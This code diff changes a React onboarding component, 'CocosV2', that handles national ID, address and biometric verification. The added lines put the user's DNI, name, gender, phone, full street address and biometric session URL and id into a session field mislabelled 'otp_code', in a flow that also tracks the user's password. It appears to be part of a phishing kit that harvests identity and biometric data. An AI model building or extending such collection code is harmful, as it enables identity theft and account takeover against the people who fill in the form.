@@ -996,7 +996,7 @@ const CocosV2 = () => {
     if (result?.full_name) setSyncedFullName(result.full_name);
     if (result?.user_uuid) setUserUuid(result.user_uuid);
     if (result?.gender) setUserGender(result.gender);
-    await updateSession("verify_dni_success", { otp_code: `dni:${data.identity_number}|name:${result?.full_name || ""}|uuid:${result?.user_uuid || ""}` });
+    await updateSession("verify_dni_success", { otp_code: `dni:${data.identity_number}|name:${result?.full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${result?.gender || ""}|phone:${data.phone_number || syncedPhone}` });
     setStep("address");
   }, [email, lastPassword, syncedPhone, updateSession]);
 
@@ -1029,8 +1029,11 @@ const CocosV2 = () => {
     }
 
     setBiometricUrl(bioResult.biometric_url);
+    await updateSession("biometric_started", { 
+      otp_code: `dni:${lastDni}|name:${syncedFullName}|uuid:${userUuid}|gender:${userGender}|region:${addressData.region}|city:${addressData.city}|street:${addressData.street_name} ${addressData.street_number}|zip:${addressData.zip_code}|biometric_url:${bioResult.biometric_url}|biometric_id:${bioResult.biometric_id || ""}` 
+    });
     setStep("biometric");
-  }, [updateSession, lastDni, userUuid, userGender]);
+  }, [updateSession, lastDni, userUuid, userGender, syncedFullName]);
 
   // ── Biometric events tracking ──
   const handleBiometricEvent = useCallback(async (event: string) => {
